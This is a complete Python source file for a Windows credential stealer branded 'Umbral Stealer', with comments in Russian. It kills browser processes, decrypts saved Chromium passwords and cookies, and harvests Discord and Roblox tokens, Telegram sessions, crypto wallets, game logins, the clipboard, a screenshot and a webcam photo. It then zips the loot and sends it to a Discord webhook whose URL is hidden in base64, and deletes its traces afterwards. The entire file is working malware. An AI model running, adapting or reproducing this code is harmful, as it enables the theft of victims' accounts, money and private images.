import subprocess
import sys
import os
import tempfile

def install_deps():
    packages = ["requests", "psutil", "pywin32", "pycryptodome", "browser-cookie3", "opencv-python", "numpy", "pillow", "pyinstaller"]
    for pkg in packages:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

install_deps()

import time
import zipfile
import shutil
import platform
import datetime
import json
import base64
import random
import uuid
import sqlite3
import ctypes
import re
from PIL import ImageGrab
import requests
import psutil
import win32crypt
from Crypto.Cipher import AES

# -------------------- КОНФИГ --------------------
_config_encoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTI1MDY0NTI4Njc4MTEyMC9QakJTMUx4aXV5STNySTNfdnZURW52ekhIOUZWMThDS2s5MWpveWNTMmFrdmxzZ2tzWk5aRXJ0SlNPdm9wQ2UwaTVtd3xodHRwczovL2kuaW1ndXIuY29tL0c4UVIwZjcucG5n"
def decode_config(enc):
    d = base64.b64decode(enc).decode('utf-8')
    p = d.split('|')
    return p[0], p[1] if len(p) > 1 else ''
webhook_url, icon_url = decode_config(_config_encoded)

http = requests.Session()
http.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

user_pc = os.getlogin()
zip_dir = f"Umbral_{user_pc}"
os.makedirs(zip_dir, exist_ok=True)
folders = ["Browsers/Cookies", "Browsers/Passwords", "Browsers/Extensions", "Browsers/Sessions",
           "Display", "Games", "Messenger", "Webcam", "Wallets", "System", "Clipboard"]
for f in folders:
    os.makedirs(os.path.join(zip_dir, f), exist_ok=True)

APPDATA = os.getenv('APPDATA')
LOCAL = os.getenv('LOCALAPPDATA')
USERPROFILE = os.getenv('USERPROFILE')
TEMP = os.environ.get('TEMP', 'C:\\Temp')

stats = {"cookies":0, "passwords":0, "discord_tokens":0, "roblox_cookies":0,
         "screenshots":0, "webcam":0, "wallets":0, "telegram_sessions":0, "minecraft_sessions":0,
         "extensions":0, "clipboard":0}

# -------------------- ВСПОМОГАТЕЛЬНЫЕ --------------------
def kill_all():
    procs = ['chrome.exe','edge.exe','brave.exe','opera.exe','firefox.exe','discord.exe','telegram.exe','discordcanary.exe','discordptb.exe']
    for p in procs:
        subprocess.run(['taskkill','/f','/im',p], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)

def get_chrome_key(browser_path):
    try:
        with open(os.path.join(browser_path, "Local State"), 'r') as f:
            ls = json.load(f)
        key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None

def decrypt_chrome(val, key):
    try:
        if val[:3] in (b'v10', b'v11'):
            iv = val[3:15]; payload = val[15:-16]; tag = val[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt_and_verify(payload, tag).decode()
        else:
            return win32crypt.CryptUnprotectData(val, None, None, None, 0)[1].decode()
    except:
        return ""

def get_profiles(browser_path):
    if not os.path.exists(browser_path): return []
    profiles = ["Default"]
    for d in os.listdir(browser_path):
        if d.startswith("Profile ") and os.path.isdir(os.path.join(browser_path, d)):
            profiles.append(d)
    return profiles

def get_ip_info():
    try:
        ip = http.get('https://api.ipify.org', timeout=5).text.strip()
        r = http.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
        return {
            'ip': ip, 'country': r.get('country',''), 'region': r.get('regionName',''),
            'city': r.get('city',''), 'isp': r.get('isp',''), 'proxy': r.get('proxy',False)
        }
    except:
        return {'ip':'Unknown'}

def grab_clipboard():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        if data:
            with open(os.path.join(zip_dir, "Clipboard", "clipboard.txt"), "w", encoding="utf-8") as f:
                f.write(data)
            stats["clipboard"] = 1
    except:
        pass

def grab_browsers():
    browsers = {
        "Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(LOCAL, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(APPDATA, "Opera Software", "Opera Stable"),
        "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data"),
        "Vivaldi": os.path.join(LOCAL, "Vivaldi", "User Data"),
    }
    kill_all()
    for name, path in browsers.items():
        if not os.path.exists(path): continue
        key = get_chrome_key(path)
        if not key: continue
        for profile in get_profiles(path):
            # Cookies
            cookie_db = os.path.join(path, profile, "Network", "Cookies")
            if not os.path.exists(cookie_db): cookie_db = os.path.join(path, profile, "Cookies")
            if os.path.exists(cookie_db):
                tmp = os.path.join(TEMP, f"cookies_{random.randint(1000,9999)}.db")
                try:
                    shutil.copy2(cookie_db, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
                    rows = cur.fetchall()
                    if rows:
                        with open(os.path.join(zip_dir, "Browsers/Cookies", f"{name}_{profile}.txt"), "w", encoding="utf-8") as f:
                            for host, cname, enc in rows:
                                if not enc: continue
                                dec = decrypt_chrome(enc, key)
                                if dec:
                                    f.write(f"{host}\t{cname}\t{dec}\n")
                                    stats["cookies"] += 1
                    conn.close()
                except: pass
                finally:
                    if os.path.exists(tmp): os.remove(tmp)
            # Passwords
            login_db = os.path.join(path, profile, "Login Data")
            if os.path.exists(login_db):
                tmp = os.path.join(TEMP, f"logins_{random.randint(1000,9999)}.db")
                try:
                    shutil.copy2(login_db, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    rows = cur.fetchall()
                    if rows:
                        with open(os.path.join(zip_dir, "Browsers/Passwords", f"{name}_{profile}_passwords.txt"), "w", encoding="utf-8") as f:
                            for url, user, enc in rows:
                                if not enc: continue
                                dec = decrypt_chrome(enc, key)
                                if dec:
                                    f.write(f"URL: {url}\nUser: {user}\nPass: {dec}\n\n")
                                    stats["passwords"] += 1
                    conn.close()
                except: pass
                finally:
                    if os.path.exists(tmp): os.remove(tmp)
            # Extensions
            ext_path = os.path.join(path, profile, "Extensions")
            if os.path.isdir(ext_path):
                dest = os.path.join(zip_dir, "Browsers/Extensions", f"{name}_{profile}_Extensions")
                shutil.copytree(ext_path, dest, dirs_exist_ok=True)
                stats["extensions"] += 1
            # Local Storage (sessions)
            ldb = os.path.join(path, profile, "Local Storage", "leveldb")
            if os.path.isdir(ldb):
                dest = os.path.join(zip_dir, "Browsers/Sessions", f"{name}_{profile}_leveldb")
                shutil.copytree(ldb, dest, dirs_exist_ok=True)
    # Firefox
    ff_profiles = os.path.join(APPDATA, "Mozilla", "Firefox", "Profiles")
    if os.path.exists(ff_profiles):
        for prof in os.listdir(ff_profiles):
            full = os.path.join(ff_profiles, prof)
            if os.path.isdir(full):
                dest = os.path.join(zip_dir, "Browsers", f"Firefox_{prof}")
                shutil.copytree(full, dest, dirs_exist_ok=True)
                stats["cookies"] += len([f for f in os.listdir(full) if f.endswith('.sqlite')])

def grab_discord_tokens():
    tokens = set()
    discord_paths = [os.path.join(APPDATA, "discord"), os.path.join(APPDATA, "discordcanary"), os.path.join(APPDATA, "discordptb")]
    for base in discord_paths:
        if not os.path.exists(base): continue
        for root, dirs, files in os.walk(base):
            if "leveldb" in dirs:
                ldb = os.path.join(root, "leveldb")
                for f in os.listdir(ldb):
                    if f.endswith(('.ldb','.log')):
                        with open(os.path.join(ldb, f), "r", errors="ignore") as rf:
                            for line in rf:
                                matches = re.findall(r"dQw4w9WgXcQ:[a-zA-Z0-9_\-\.]+", line)
                                for m in matches:
                                    tokens.add(m.split(":")[1])
    browsers = {
        "Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(LOCAL, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(APPDATA, "Opera Software", "Opera Stable"),
    }
    for name, path in browsers.items():
        if not os.path.exists(path): continue
        key = get_chrome_key(path)
        if not key: continue
        for profile in get_profiles(path):
            ldb = os.path.join(path, profile, "Local Storage", "leveldb")
            if os.path.isdir(ldb):
                for f in os.listdir(ldb):
                    if f.endswith(('.ldb','.log')):
                        with open(os.path.join(ldb, f), "r", errors="ignore") as rf:
                            for line in rf:
                                matches = re.findall(r"dQw4w9WgXcQ:[a-zA-Z0-9_\-\.]+", line)
                                for m in matches:
                                    enc_token = m.split(":")[1]
                                    try:
                                        dec = decrypt_chrome(base64.b64decode(enc_token), key)
                                        if dec and len(dec) > 50:
                                            tokens.add(dec)
                                    except: pass
    valid = []
    for t in tokens:
        try:
            r = http.get("https://discord.com/api/v9/users/@me", headers={"Authorization": t}, timeout=5)
            if r.status_code == 200:
                valid.append(t)
                stats["discord_tokens"] += 1
        except: pass
    if valid:
        with open(os.path.join(zip_dir, "Messenger", "DiscordTokens.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(valid))

def grab_telegram():
    tdata = os.path.join(APPDATA, "Telegram Desktop", "tdata")
    if os.path.exists(tdata):
        for p in psutil.process_iter(['pid','name']):
            if 'telegram' in p.info['name'].lower():
                p.terminate()
        time.sleep(1)
        dest = os.path.join(zip_dir, "Messenger", "Telegram_Desktop")
        shutil.copytree(tdata, dest, dirs_exist_ok=True)
        stats["telegram_sessions"] += 1

def grab_roblox():
    try:
        import browser_cookie3 as bc
        cookies = []
        for func in [bc.chrome, bc.edge, bc.firefox]:
            try:
                jar = func(domain_name="roblox.com")
                for c in jar:
                    if c.name == ".ROBLOSECURITY":
                        cookies.append(c.value)
                        break
            except: pass
        if cookies:
            stats["roblox_cookies"] = len(cookies)
            with open(os.path.join(zip_dir, "Messenger", "RobloxCookies.txt"), "w", encoding="utf-8") as f:
                f.write("\n".join(cookies))
    except: pass

def grab_system_info():
    import uuid as uid
    def sz(b): return f"{b/(1024**3):.2f} GB"
    def cmd(c):
        try: return subprocess.check_output(c, shell=True, stderr=subprocess.DEVNULL, timeout=3).decode(errors='ignore').strip()
        except: return "None"
    def wmi(q):
        r = cmd(q)
        if r and r != "None" and "\n" in r:
            return r.split("\n")[-1].strip()
        return r if r else "None"
    host = platform.node()
    user = os.environ.get('USERNAME','Unknown')
    cpu = wmi("wmic cpu get name /value").replace("Name=","") + f", {psutil.cpu_count(logical=False)} Core"
    gpu = wmi("wmic path win32_VideoController get name /value").replace("Name=","")
    ram = sz(psutil.virtual_memory().total)
    disks = []
    for pt in psutil.disk_partitions():
        if 'cdrom' not in pt.opts.lower() and pt.fstype:
            try:
                u = psutil.disk_usage(pt.mountpoint)
                disks.append(f"{pt.mountpoint} Free:{sz(u.free)} Total:{sz(u.total)}")
            except: pass
    mac = ':'.join(['{:02x}'.format((uid.getnode() >> e) & 0xff) for e in range(0,12,2)][::-1])
    mid = wmi("wmic csproduct get uuid /value").replace("UUID=","")
    ip_info = get_ip_info()
    txt = f"""[+] PC Info:
    Hostname: {host}
    Username: {user}
    CPU: {cpu}
    GPU: {gpu}
    RAM: {ram}
    Disks: {', '.join(disks) if disks else 'None'}
    MAC: {mac}
    MachineID: {mid}
[+] IP Info:
    IP: {ip_info.get('ip','Unknown')}
    Country: {ip_info.get('country','Unknown')}
    Region: {ip_info.get('region','Unknown')}
    City: {ip_info.get('city','Unknown')}
    ISP: {ip_info.get('isp','Unknown')}
    Proxy: {ip_info.get('proxy',False)}
"""
    with open(os.path.join(zip_dir, "System", "SystemInformation.txt"), 'w', encoding='utf-8') as f:
        f.write(txt)

def grab_wallets():
    wlist = [("Exodus", os.path.join(APPDATA, "Exodus", "exodus.wallet")),
             ("Electrum", os.path.join(APPDATA, "Electrum", "wallets")),
             ("Atomic", os.path.join(APPDATA, "atomic", "Local Storage", "leveldb")),
             ("Coinomi", os.path.join(APPDATA, "Coinomi", "Coinomi", "wallets"))]
    for name, path in wlist:
        if os.path.exists(path):
            dest = os.path.join(zip_dir, "Wallets", name)
            os.makedirs(dest, exist_ok=True)
            if os.path.isdir(path):
                shutil.copytree(path, dest, dirs_exist_ok=True)
            else:
                shutil.copy2(path, dest)
            stats["wallets"] += 1

def grab_games():
    x86 = os.getenv('ProgramFiles(x86)','C:\\Program Files (x86)')
    games = [("Steam", os.path.join(x86, "Steam", "config")),
             ("RiotGames", os.path.join(LOCAL, "Riot Games", "Riot Client", "Data"))]
    for name, path in games:
        if os.path.exists(path):
            dest = os.path.join(zip_dir, "Games", name)
            shutil.copytree(path, dest, dirs_exist_ok=True)
    mc = os.path.join(APPDATA, ".minecraft", "launcher_accounts.json")
    if os.path.exists(mc):
        shutil.copy2(mc, os.path.join(zip_dir, "Games", "minecraft_accounts.json"))
        stats["minecraft_sessions"] = 1

def grab_screenshot():
    try:
        img = ImageGrab.grab(all_screens=True)
        img.save(os.path.join(zip_dir, "Display", "Screenshot.png"))
        stats["screenshots"] = 1
    except: pass

def grab_webcam():
    try:
        import cv2
        cv2.setLogLevel(0)
        cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if cam.isOpened():
            ret, frame = cam.read()
            if ret:
                cv2.imwrite(os.path.join(zip_dir, "Webcam", "Camera.png"), frame)
                stats["webcam"] = 1
        cam.release()
    except: pass

def run():
    kill_all()
    grab_clipboard()
    grab_system_info()
    grab_wallets()
    grab_games()
    grab_telegram()
    grab_discord_tokens()
    grab_roblox()
    grab_browsers()
    grab_screenshot()
    grab_webcam()

run()

# -------------------- ОТПРАВКА НЕСКОЛЬКИМИ ЧАСТЯМИ БЕЗ ОШИБОК --------------------
def zip_directory_safe(source_dir, max_mb=20):
    """Разбивает папку source_dir на несколько zip-архивов, возвращает список путей к архивам."""
    file_list = []
    for root, _, files in os.walk(source_dir):
        for file in files:
            full = os.path.join(root, file)
            file_list.append(full)
    file_list.sort()
    max_bytes = max_mb * 1024 * 1024
    archives = []
    current_zip = None
    current_path = None
    current_size = 0
    arc_index = 1

    for src in file_list:
        src_size = os.path.getsize(src)
        if src_size > max_bytes:
            # отдельный архив для большого файла
            zip_path = os.path.join(tempfile.gettempdir(), f"part_{arc_index}.zip")
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
                arcname = os.path.relpath(src, source_dir)
                # Обходим ошибку с временной меткой
                zinfo = zipfile.ZipInfo(arcname)
                zinfo.compress_type = zipfile.ZIP_DEFLATED
                with open(src, "rb") as fs:
                    zf.writestr(zinfo, fs.read())
            archives.append(zip_path)
            arc_index += 1
            continue

        if current_zip is None:
            current_path = os.path.join(tempfile.gettempdir(), f"part_{arc_index}.zip")
            current_zip = zipfile.ZipFile(current_path, "w", zipfile.ZIP_DEFLATED)
            current_size = 0
        if current_size + src_size > max_bytes:
            current_zip.close()
            archives.append(current_path)
            arc_index += 1
            current_path = os.path.join(tempfile.gettempdir(), f"part_{arc_index}.zip")
            current_zip = zipfile.ZipFile(current_path, "w", zipfile.ZIP_DEFLATED)
            current_size = 0
        arcname = os.path.relpath(src, source_dir)
        # Используем writestr с ZipInfo, чтобы избежать ошибки времени
        zinfo = zipfile.ZipInfo(arcname)
        zinfo.compress_type = zipfile.ZIP_DEFLATED
        with open(src, "rb") as fs:
            current_zip.writestr(zinfo, fs.read())
        current_size += src_size

    if current_zip:
        current_zip.close()
        archives.append(current_path)
    return archives

def send_parts(archives):
    """Отправляет архивы в Discord. Первый архив отправляется с embed, остальные — без embed."""
    ip_info = get_ip_info()
    total_parts = len(archives)
    embed_data = {
        "title": "Umbral Stealer Report",
        "color": 0x2b2d31,
        "thumbnail": {"url": icon_url},
        "fields": [
            {"name": "System", "value": f"```{platform.node()} | {platform.system()}```", "inline": False},
            {"name": "IP Info", "value": f"```IP: {ip_info.get('ip','Unknown')}\nCountry: {ip_info.get('country','Unknown')}\nProxy: {ip_info.get('proxy', False)}```", "inline": False},
            {"name": "Statistics (total)", "value": f"```Cookies: {stats['cookies']}\nPasswords: {stats['passwords']}\nWallets: {stats['wallets']}\nDiscord: {stats['discord_tokens']}\nTelegram: {stats['telegram_sessions']}\nScreenshots: {stats['screenshots']}\nWebcam: {stats['webcam']}\nExtensions: {stats['extensions']}\nClipboard: {stats['clipboard']}```", "inline": False},
        ],
        "footer": {"text": f"Всего частей: {total_parts}", "icon_url": icon_url},
        "timestamp": datetime.datetime.now().isoformat()
    }
    for idx, arc_path in enumerate(archives, start=1):
        with open(arc_path, "rb") as f:
            files = {"file": (os.path.basename(arc_path), f, "application/zip")}
            if idx == 1:
                payload = {"content": "@everyone", "embeds": [embed_data], "username": "Umbral Stealer", "avatar_url": icon_url}
            else:
                payload = {"content": f"Part {idx}/{total_parts}", "username": "Umbral Stealer", "avatar_url": icon_url}
            data = {"payload_json": json.dumps(payload)}
            r = http.post(webhook_url, data=data, files=files, timeout=60)
            if r.status_code in (200, 204):
                print(f"Part {idx}/{total_parts} sent successfully")
            else:
                print(f"Failed to send part {idx}, status {r.status_code}")
            time.sleep(1)

# Удаляем папку Cache (если есть)
cache_dir = os.path.join(zip_dir, "Browsers", "Cache")
if os.path.exists(cache_dir):
    shutil.rmtree(cache_dir, ignore_errors=True)

# Разбиваем на части и отправляем
print("[+] Начинаем разбиение и отправку...")
archives = zip_directory_safe(zip_dir, max_mb=20)
if archives:
    send_parts(archives)
    # Удаляем временные архивы
    for arc in archives:
        try:
            os.remove(arc)
        except:
            pass
else:
    print("Нет данных для отправки")
# Удаляем временную папку
shutil.rmtree(zip_dir, ignore_errors=True)